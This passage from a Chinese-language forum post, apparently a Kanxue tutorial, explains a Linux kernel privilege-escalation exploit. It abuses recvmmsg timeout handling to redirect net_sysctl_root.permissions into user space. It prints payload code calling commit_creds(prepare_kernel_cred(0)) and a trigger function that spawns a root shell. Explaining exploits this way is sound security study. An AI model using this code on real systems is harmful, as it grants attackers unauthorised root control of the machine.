
这样一来，将上图标红的`0xff`字节所在地址`0xffffffff81cdf496+7`（图中按大端字节序书写），作为`timeout`地址传给`__sys_recvmmsg()`，就可以使`timeout->tv_sec = 0xff`（标红的8字节），`timeout->tv_nsec = 0`（更上方的8字节）：

![](https://bbs.kanxue.com/upload/attach/202507/815036_22Q2HBGUPHRPPPM.webp)

同理，再将`0xffffffff81cdf496+6`、`0xffffffff81cdf496+5`作为`timeout`地址，触发`__sys_recvmmsg()`执行超时处理逻辑，设置`timeout->tv_sec = 0`，就可以将`net_sysctl_root.permissions`，从`0xffffffff816d4ff0`，改为`0x000000ff816d4ff0`。

![](https://bbs.kanxue.com/upload/attach/202507/815036_4T74GUX7MS6RVWK.webp)

刚开始，我有一个疑问，既然有`timeout`，为什么还要子进程执行`sendto()`，父进程的`recvmmsg()`才能退出阻塞？

通过[`__sys_recvmmsg()`代码](https://bbs.kanxue.com/elink@5cdK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6W2L8r3W2^5K9i4u0Q4x3X3g2T1L8$3!0@1L8r3W2F1i4K6u0W2j5$3!0E0i4K6u0r3L8r3W2F1N6i4S2Q4x3V1k6$3x3#2)9J5k6e0p5I4i4K6u0r3M7$3!0#2M7X3y4W2i4K6u0r3L8X3g2@1i4K6u0r3M7$3!0U0K9$3g2@1i4K6u0W2j5#2)9J5x3@1H3J5x3K6l9@1)可以看出，它的内部是个循环，直到接收`vlen`个`msg`，而每次循环都是阻塞的，必须收到`msg`才会退出阻塞，`timeout`只是为了让`__sys_recvmmsg()`，不用必须等到收满`vlen`个`msg`才返回，用于缓解收到少量`msg`，但长时间没有继续收到`msg`时，已经收到的`msg`也得不到处理。

(2) 向`net_sysctl_root.permissions`指向的用户空间，填充提权指令：

```
static int __attribute__((regparm(3)))

getroot(void *head, void * table)

{

    commit_creds(prepare_kernel_cred(0));

    return -1;

}



void __attribute__((regparm(3)))

trampoline()

{

    asm("mov $getroot, %rax; call *%rax;");

}
```

填充逻辑比较简单，就是调用`mmap()`，分配`0x000000ff816d4ff0`所在的虚拟页面，并设置可执行权限，然后将以上代码编译出来的指令，复制进去，其中，`commit_creds`和`prepare_kernel_cred`都是函数指针，后续在触发提权代码执行之前，会让它们指向内核中的`commit_creds()`和`prepare_kernel_cred()`函数。

(3) 对`/proc/sys/net`执行打开操作，触发内核执行`net_sysctl_root.permissions()`：

```
void trigger() {

    open("/proc/sys/net/core/somaxconn",O_RDONLY);



    if(getuid() != 0) {

        fprintf(stderr,"not root, ya blew it!\n");

        exit(-1);

    }



    fprintf(stderr,"w00p w00p!\n");

    system("/bin/sh -i");

}
```

打开`/proc/sys/net`时，就会切换到内核态，执行`net_sysctl_root.permissions()`，而此时它已经指向用户空间，通过一段`nop`指令，滑行到`trampoline()`函数，最终执行`commit_creds(prepare_kernel_cred(0))`，完成提权：

![](https://bbs.kanxue.com/upload/attach/202507/815036_KUS47QCS8AZGJ4S.webp)

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

最后于 2026-2-5 16:48 被jmpcall编辑，原因：

[#Linux](https://bbs.kanxue.com/forum-150-1-161.htm)

[#漏洞利用](https://bbs.kanxue.com/forum-150-1-154.htm)

上传的附件：

- [xx.tar.xz](javascript:void(0);)

  （7.14MB，5次下载）
